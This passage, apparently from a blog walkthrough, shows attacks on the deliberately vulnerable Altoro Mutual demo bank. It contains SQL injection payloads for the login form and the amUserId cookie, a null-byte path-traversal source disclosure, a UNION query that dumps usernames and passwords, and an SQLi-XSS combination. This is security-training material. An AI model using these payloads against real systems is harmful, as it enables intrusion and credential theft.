</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: en-us,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Proxy-Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://demo.testfire.net/bank/login.aspx
</span></span><span class="line"><span class="cl">Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==<span class="err">&amp;</span>Password=dGVzdA==
</span></span><span class="line"><span class="cl">Content-Type: application/x-www-form-urlencoded
</span></span><span class="line"><span class="cl">Content-Length: 50
</span></span><span class="line"><span class="cl">uid=admin<span class="err">&amp;</span>passw=&#39; OR 1=1;--<span class="err">&amp;</span>btnSubmit=Login
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="base64-encoded-login-credentials">Base64-encoded login credentials</h3>
<p>After a successful login the server will set a cookie <em>amUserInfo</em> which contains login information encoded in base64. This is for sure a vulnerability since an attacker could easily decode the information and get the login credentials.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">amUserInfo=UserName=YWRtaW4nIE9SIDE9MjstLQ==&amp;Password=dGVzdA==
</span></span></code></pre></td></tr></table>
</div>
</div><p>decodes to&hellip;</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">amUserInfo=Username=admin&#39; OR 1=2;--&amp;Password=test
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="bankmainaspx">/bank/main.aspx</h2>
<p>After a successful login you&rsquo;ll be redirected to <a href="http://demo.testfire.net/bank/main.aspx">http://demo.testfire.net/bank/main.aspx</a>. Let&rsquo;s have a look at the functionalities within this page.</p>
<h3 id="source-code-disclosure">Source code disclosure&lt;</h3>
<p>Here&rsquo;s the source code (<a href="http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%EF%BF%BD.txt">http://demo.testfire.net/default.aspx?content=../bank/main.aspx.cs%00.txt</a>)</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">  1
</span><span class="lnt">  2
</span><span class="lnt">  3
</span><span class="lnt">  4
</span><span class="lnt">  5
</span><span class="lnt">  6
</span><span class="lnt">  7
</span><span class="lnt">  8
</span><span class="lnt">  9
</span><span class="lnt"> 10
</span><span class="lnt"> 11
</span><span class="lnt"> 12
</span><span class="lnt"> 13
</span><span class="lnt"> 14
</span><span class="lnt"> 15
</span><span class="lnt"> 16
</span><span class="lnt"> 17
</span><span class="lnt"> 18
</span><span class="lnt"> 19
</span><span class="lnt"> 20
</span><span class="lnt"> 21
</span><span class="lnt"> 22
</span><span class="lnt"> 23
</span><span class="lnt"> 24
</span><span class="lnt"> 25
</span><span class="lnt"> 26
</span><span class="lnt"> 27
</span><span class="lnt"> 28
</span><span class="lnt"> 29
</span><span class="lnt"> 30
</span><span class="lnt"> 31
</span><span class="lnt"> 32
</span><span class="lnt"> 33
</span><span class="lnt"> 34
</span><span class="lnt"> 35
</span><span class="lnt"> 36
</span><span class="lnt"> 37
</span><span class="lnt"> 38
</span><span class="lnt"> 39
</span><span class="lnt"> 40
</span><span class="lnt"> 41
</span><span class="lnt"> 42
</span><span class="lnt"> 43
</span><span class="lnt"> 44
</span><span class="lnt"> 45
</span><span class="lnt"> 46
</span><span class="lnt"> 47
</span><span class="lnt"> 48
</span><span class="lnt"> 49
</span><span class="lnt"> 50
</span><span class="lnt"> 51
</span><span class="lnt"> 52
</span><span class="lnt"> 53
</span><span class="lnt"> 54
</span><span class="lnt"> 55
</span><span class="lnt"> 56
</span><span class="lnt"> 57
</span><span class="lnt"> 58
</span><span class="lnt"> 59
</span><span class="lnt"> 60
</span><span class="lnt"> 61
</span><span class="lnt"> 62
</span><span class="lnt"> 63
</span><span class="lnt"> 64
</span><span class="lnt"> 65
</span><span class="lnt"> 66
</span><span class="lnt"> 67
</span><span class="lnt"> 68
</span><span class="lnt"> 69
</span><span class="lnt"> 70
</span><span class="lnt"> 71
</span><span class="lnt"> 72
</span><span class="lnt"> 73
</span><span class="lnt"> 74
</span><span class="lnt"> 75
</span><span class="lnt"> 76
</span><span class="lnt"> 77
</span><span class="lnt"> 78
</span><span class="lnt"> 79
</span><span class="lnt"> 80
</span><span class="lnt"> 81
</span><span class="lnt"> 82
</span><span class="lnt"> 83
</span><span class="lnt"> 84
</span><span class="lnt"> 85
</span><span class="lnt"> 86
</span><span class="lnt"> 87
</span><span class="lnt"> 88
</span><span class="lnt"> 89
</span><span class="lnt"> 90
</span><span class="lnt"> 91
</span><span class="lnt"> 92
</span><span class="lnt"> 93
</span><span class="lnt"> 94
</span><span class="lnt"> 95
</span><span class="lnt"> 96
</span><span class="lnt"> 97
</span><span class="lnt"> 98
</span><span class="lnt"> 99
</span><span class="lnt">100
</span><span class="lnt">101
</span><span class="lnt">102
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">using System.Collections;
</span></span><span class="line"><span class="cl">using System.ComponentModel;
</span></span><span class="line"><span class="cl">using System.Data;
</span></span><span class="line"><span class="cl">using System.Data.OleDb;
</span></span><span class="line"><span class="cl">using System.Web;
</span></span><span class="line"><span class="cl">using System.Web.SessionState;
</span></span><span class="line"><span class="cl">using System.Web.UI;
</span></span><span class="line"><span class="cl">using System.Web.UI.WebControls;
</span></span><span class="line"><span class="cl">using System.Web.UI.HtmlControls;
</span></span><span class="line"><span class="cl">using System.Configuration;
</span></span><span class="line"><span class="cl">namespace Altoro
</span></span><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    /// &lt;summary&gt;
</span></span><span class="line"><span class="cl">    /// Summary description for welcome.
</span></span><span class="line"><span class="cl">    /// &lt;/summary&gt;
</span></span><span class="line"><span class="cl">    public partial class Default : Page
</span></span><span class="line"><span class="cl">    {
</span></span><span class="line"><span class="cl">        protected void Page_Load(object sender, System.EventArgs e)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            Response.Cache.SetCacheability(HttpCacheability.NoCache);
</span></span><span class="line"><span class="cl">            if (!(System.Convert.ToBoolean(Session[&#34;authenticated&#34;])))
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                Server.Transfer(&#34;logout.aspx&#34;);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">            string thisUser = Request.Cookies[&#34;amUserId&#34;].Value;
</span></span><span class="line"><span class="cl">            DataRow myRow;
</span></span><span class="line"><span class="cl">            DataTable acctTable = GetAccounts(thisUser);
</span></span><span class="line"><span class="cl">            CheckPromo(thisUser);
</span></span><span class="line"><span class="cl">            for (int i = 0; i &lt; acctTable.Rows.Count; i++)
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                myRow = acctTable.Rows[i];
</span></span><span class="line"><span class="cl">                ArrayList myList = new ArrayList();
</span></span><span class="line"><span class="cl">                myList.Add(myRow[&#34;accountid&#34;].ToString());
</span></span><span class="line"><span class="cl">                myList.Add(myRow[&#34;accountid&#34;].ToString() + &#34; &#34; + myRow[&#34;acct_type&#34;].ToString());
</span></span><span class="line"><span class="cl">                listAccounts.myItems.Add(myList);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        private DataTable GetAccounts(string userId)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            OleDbConnection myConnection = new OleDbConnection();
</span></span><span class="line"><span class="cl">            myConnection.ConnectionString = ConfigurationManager.ConnectionStrings[&#34;DBConnStr&#34;].ConnectionString;
</span></span><span class="line"><span class="cl">            myConnection.Open();
</span></span><span class="line"><span class="cl">            string query = &#34;SELECT accountid, acct_type From accounts WHERE userid = &#34; + userId;
</span></span><span class="line"><span class="cl">            OleDbDataAdapter myAccounts = new OleDbDataAdapter(query, myConnection);
</span></span><span class="line"><span class="cl">            DataSet ds = new DataSet();
</span></span><span class="line"><span class="cl">            myAccounts.Fill(ds, &#34;accounts&#34;);
</span></span><span class="line"><span class="cl">            DataTable myTable = ds.Tables[&#34;accounts&#34;];
</span></span><span class="line"><span class="cl">            myConnection.Close();
</span></span><span class="line"><span class="cl">            return myTable;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        private void WritePromo(string cType, string cLimit, string cInterest)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            string promoText = &#34;&lt;table width=590 border=0&gt;&#34;;
</span></span><span class="line"><span class="cl">            promoText += &#34;&lt;tr&gt;&lt;td&gt;&lt;h2&gt;Congratulations! &lt;/h2&gt;&lt;/td&gt;&lt;/tr&gt;&#34;;
</span></span><span class="line"><span class="cl">            promoText += &#34;&lt;tr&gt;&lt;td&gt;You have been pre-approved for an Altoro &#34;;
</span></span><span class="line"><span class="cl">            promoText += cType;
</span></span><span class="line"><span class="cl">            promoText += &#34; Visa with a credit limit of $&#34;;
</span></span><span class="line"><span class="cl">            promoText += cLimit;
</span></span><span class="line"><span class="cl">            promoText += &#34;!&lt;/td&gt;&lt;/tr&gt;&#34;;
</span></span><span class="line"><span class="cl">            promoText += &#34;&lt;tr&gt;&lt;td&gt;Click &lt;a href=&#39;apply.aspx&#34;;
</span></span><span class="line"><span class="cl">            promoText += &#34;&#39;&gt;Here&lt;/a&gt; to apply.&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&#34;;
</span></span><span class="line"><span class="cl">            promo.Visible = true;
</span></span><span class="line"><span class="cl">            promo.Text = promoText;
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        private void CheckPromo(string strUserId)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            if (Request.Cookies[&#34;amCreditOffer&#34;] != null)
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                    HttpCookie CreditOffer = Request.Cookies[&#34;amCreditOffer&#34;];
</span></span><span class="line"><span class="cl">              WritePromo(CreditOffer[&#34;CardType&#34;], CreditOffer[&#34;Limit&#34;], CreditOffer[&#34;Interest&#34;]);
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        protected String GetSessionValue(String key)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            if (Request.Cookies[&#34;amUserId&#34;].Value==Session[&#34;userId&#34;].ToString())
</span></span><span class="line"><span class="cl">            {
</span></span><span class="line"><span class="cl">                return Session[key].ToString();
</span></span><span class="line"><span class="cl">                }
</span></span><span class="line"><span class="cl">                else
</span></span><span class="line"><span class="cl">                {
</span></span><span class="line"><span class="cl">                        return &#34;&#34;;
</span></span><span class="line"><span class="cl">                }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        #region Web Form Designer generated code
</span></span><span class="line"><span class="cl">        override protected void OnInit(EventArgs e)
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">            //
</span></span><span class="line"><span class="cl">            // CODEGEN: This call is required by the ASP.NET Web Form Designer.
</span></span><span class="line"><span class="cl">            //
</span></span><span class="line"><span class="cl">            InitializeComponent();
</span></span><span class="line"><span class="cl">            base.OnInit(e);
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        /// &lt;summary&gt;
</span></span><span class="line"><span class="cl">        /// Required method for Designer support - do not modify
</span></span><span class="line"><span class="cl">        /// the contents of this method with the code editor.
</span></span><span class="line"><span class="cl">        /// &lt;/summary&gt;
</span></span><span class="line"><span class="cl">        private void InitializeComponent()
</span></span><span class="line"><span class="cl">        {
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">        #endregion
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="sql-injection-using-cookie-data">SQL injection using Cookie data</h3>
<p>After login following request will be sent to the server:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span><span class="lnt">9
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">GET /bank/main.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:10.0.6) Gecko/20100101 Firefox/10.0.6
</span></span><span class="line"><span class="cl">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
</span></span><span class="line"><span class="cl">Accept-Language: en-us,en;q=0.5
</span></span><span class="line"><span class="cl">Accept-Encoding: gzip, deflate
</span></span><span class="line"><span class="cl">Proxy-Connection: keep-alive
</span></span><span class="line"><span class="cl">Referer: http://demo.testfire.net/bank/login.aspx
</span></span><span class="line"><span class="cl">Cookie: ASP.NET_SessionId=2ks1fprgokgkd0jthbms3d25; amSessionId=62733112717; amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=1
</span></span></code></pre></td></tr></table>
</div>
</div><p>A look at the <em>GetAccounts</em> in the source code reveals that <em>userId</em> is actually some data from the cookie <em>amUserId</em> and never gets sanitized. Let&rsquo;s have some fun:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">GET /bank/main.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">amUserInfo=UserName=YWRtaW4=&amp;Password=YWRtaW4=; amUserId=1&#39;
</span></span></code></pre></td></tr></table>
</div>
</div><p><em>amUserId</em> was changed and the whole GET request was sent again to the server. The response was quite informative:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">An</span> <span class="n">Error</span> <span class="n">Has</span> <span class="n">Occurred</span>
</span></span><span class="line"><span class="cl"><span class="n">Summary</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">Syntax</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">string</span> <span class="ow">in</span> <span class="n">query</span> <span class="n">expression</span> <span class="s1">&#39;userid = 1&#39;&#39;.</span>
</span></span><span class="line"><span class="cl"><span class="n">Error</span> <span class="n">Message</span><span class="p">:</span>
</span></span><span class="line"><span class="cl"><span class="n">System</span><span class="o">.</span><span class="n">Data</span><span class="o">.</span><span class="n">OleDb</span><span class="o">.</span><span class="n">OleDbException</span><span class="p">:</span> <span class="n">Syntax</span> <span class="n">error</span> <span class="ow">in</span> <span class="n">string</span> <span class="ow">in</span> <span class="n">query</span> <span class="n">expression</span> <span class="s1">&#39;userid = 1&#39;&#39;. at System.Data.OleDb.OleDbCommand.ExecuteCommandTextErrorHandling(OleDbHResult hr) at System.Data.OleDb.OleDbCommand.ExecuteCommandTextForSingleResult(tagDBPARAMS dbParams, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommandText(Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteCommand(CommandBehavior behavior, Object&amp; executeResult) at System.Data.OleDb.OleDbCommand.ExecuteReaderInternal(CommandBehavior behavior, String method) at System.Data.OleDb.OleDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.OleDb.OleDbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior) at System.Data.Common.DbDataAdapter.FillInternal(DataSet dataset, DataTable[] datatables, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, Int32 startRecord, Int32 maxRecords, String srcTable, IDbCommand command, CommandBehavior behavior) at System.Data.Common.DbDataAdapter.Fill(DataSet dataSet, String srcTable) at Altoro.Default.GetAccounts(String userId) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 54 at Altoro.Default.Page_Load(Object sender, EventArgs e) in d:downloadsAltoroMutual_v6websitankmain.aspx.cs:line 31 at System.Web.Util.CalliHelper.EventArgFunctionCaller(IntPtr fp, Object o, Object t, EventArgs e) at System.Web.Util.CalliEventHandlerDelegateProxy.Callback(Object sender, EventArgs e) at System.Web.UI.Control.OnLoad(EventArgs e) at System.Web.UI.Control.LoadRecursive() at System.Web.UI.Page.ProcessRequestMain(Boolean includeStagesBeforeAsyncPoint, Boolean includeStagesAfterAsyncPoint)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ahhh, there we go! <strong>Another SQL injection vulnerability!</strong> You could now dump some data:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">GET /bank/main.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select accountid, acct_type from accounts;--
</span></span></code></pre></td></tr></table>
</div>
</div><p>You could use this vulnerability to <strong>dump the <em>users</em> table</strong>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">GET /bank/main.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select username, password from users;--
</span></span></code></pre></td></tr></table>
</div>
</div><p>This will return:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">admin admin
</span></span><span class="line"><span class="cl">cclay Ali
</span></span><span class="line"><span class="cl">jsmith Demo1234
</span></span><span class="line"><span class="cl">sjoe frazier
</span></span><span class="line"><span class="cl">sspeed Demo1234
</span></span><span class="line"><span class="cl">tuser tuser
</span></span></code></pre></td></tr></table>
</div>
</div><p>Simple, isn&rsquo;t it?</p>
<h3 id="xss-using-cookie-data">XSS using cookie data</h3>
<p>Alternatively you could combine SQLi with XSS:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-.html" data-lang=".html"><span class="line"><span class="cl">GET /bank/main.aspx HTTP/1.1
</span></span><span class="line"><span class="cl">Host: demo.testfire.net
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">amUserInfo=UserName=YWRtaW4=<span class="ni">&amp;Password=YWRtaW4=;</span> amUserId=2 union select &#34;<span class="p">&lt;</span><span class="nt">script</span><span class="p">&gt;...&lt;/</span><span class="nt">script</span><span class="p">&gt;</span>&#34;, &#34;Injection FOUND!&#34; from accounts;--
</span></span></code></pre></td></tr></table>
</div>
</div>
    

  </div>
  
  
  






  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
    
  

  
    
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
        
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
        
      
    
      
        
      
    
      
        
      
    
      
    
      
        
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
        
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
        
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
        
      
    
      
    
      
        
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
      
    
      
    
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
        
      
    
      
    
    
      
    
  

  
    
    
      
    
      
    
      
    
      
    
      
        
      
    
    
      
    
  

  
    
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
    
      
    
      
    
      
    
      
    
      
    
    
  

  
    
    
      
